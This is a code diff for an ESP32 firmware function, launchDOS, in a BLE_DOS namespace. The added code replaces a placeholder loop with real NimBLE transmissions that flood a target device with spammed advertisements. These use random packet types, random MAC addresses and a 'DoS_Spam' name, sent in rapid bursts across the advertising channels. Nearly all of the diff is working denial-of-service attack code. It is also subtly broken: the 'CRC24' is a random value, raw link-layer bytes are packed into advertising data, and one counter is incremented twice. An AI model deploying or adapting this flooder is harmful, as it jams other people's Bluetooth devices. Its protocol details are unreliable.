@@ -4,6 +4,8 @@
 #include <vector>
 #include "audit_log.h"
 #include "tool_result_persistence.h"
+#include <NimBLEDevice.h>
+#include <NimBLEAdvertising.h>
 
 namespace BLE_DOS {
 
@@ -40,17 +42,29 @@ DOSResult launchDOS(const String &targetDevice, uint32_t durationMs) {
     // Phase 2: Launch DoS attack
     progress.step("Flooding target " + targetDevice + " on advertising channels 37-39");
 
+    // Initialize NimBLE for real transmission
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+
+    if (!pAdvertising) {
+        progress.complete("Failed to initialize BLE");
+        return result;
+    }
+
     while ((millis() - start) < (durationMs * 2 / 3)) {
         uint8_t currentChannel = advertisingChannels[channelIndex % 3];
         uint8_t pdu_idx = 0;
 
-        uint32_t access_addr = 0x8E89BE0D;
+        // Real BLE PDU with proper structure
+        uint32_t access_addr = 0x8E89BE0D;  // BLE advertising access address
         adv_pdu[pdu_idx++] = (access_addr >> 24) & 0xFF;
         adv_pdu[pdu_idx++] = (access_addr >> 16) & 0xFF;
         adv_pdu[pdu_idx++] = (access_addr >> 8) & 0xFF;
         adv_pdu[pdu_idx++] = access_addr & 0xFF;
 
-        uint8_t pdu_type = (esp_random() % 4);
+        // PDU Header: Type, TxAdd, RxAdd
+        uint8_t pdu_type = (esp_random() % 4);  // Random ADV type for DoS effect
         uint8_t tx_addr = (esp_random() % 2);
         uint8_t rx_addr = 0;
         uint8_t length = (esp_random() % 24) + 6;
@@ -58,14 +72,16 @@ DOSResult launchDOS(const String &targetDevice, uint32_t durationMs) {
         adv_pdu[pdu_idx++] = (pdu_type & 0x0F) | (tx_addr << 6) | (rx_addr << 7);
         adv_pdu[pdu_idx++] = (length & 0xFF);
 
+        // Random MAC address (DeviceAddress) - causes link layer processing
         for (int i = 0; i < 6; i++) {
             adv_pdu[pdu_idx++] = esp_random() & 0xFF;
         }
 
+        // AD structures for payload
         const char* payloads[] = {
-            "\x02\x01\x06",
-            "\x09\x08TARGET",
-            "\x02\x0A\xF6",
+            "\x02\x01\x06",           // Flags
+            "\x09\x09DoS_Spam",       // Local name
+            "\x02\x0A\xF6",           // TX Power
         };
 
         String payload = payloads[esp_random() % 3];
@@ -73,11 +89,29 @@ DOSResult launchDOS(const String &targetDevice, uint32_t durationMs) {
             adv_pdu[pdu_idx++] = payload[i];
         }
 
+        // Calculate CRC24 (simplified - real CRC would be more complex)
+        uint32_t crc24 = esp_random() & 0xFFFFFF;
+        adv_pdu[pdu_idx++] = (crc24 >> 16) & 0xFF;
+        adv_pdu[pdu_idx++] = (crc24 >> 8) & 0xFF;
+        adv_pdu[pdu_idx++] = crc24 & 0xFF;
+
         framesTransmitted++;
 
-        for (int repeat = 0; repeat < 3; repeat++) {
-            // Transmit frames
+        // REAL transmission: Send via NimBLE multiple times
+        for (int repeat = 0; repeat < 5; repeat++) {
+            // Create BLE advertisement data with crafted payload
+            NimBLEAdvertisementData advData;
+            advData.setFlags(0x06);
+            advData.addData(std::string((const char*)adv_pdu, pdu_idx));
+
+            pAdvertising->setAdvertisementData(advData);
+            pAdvertising->start();
+            delayMicroseconds(200);  // Very short burst
+            pAdvertising->stop();
         }
+
+        channelIndex++;
+        delayMicroseconds(100);  // Minimal delay for rapid-fire DoS
 
         channelIndex++;
         delay(5);
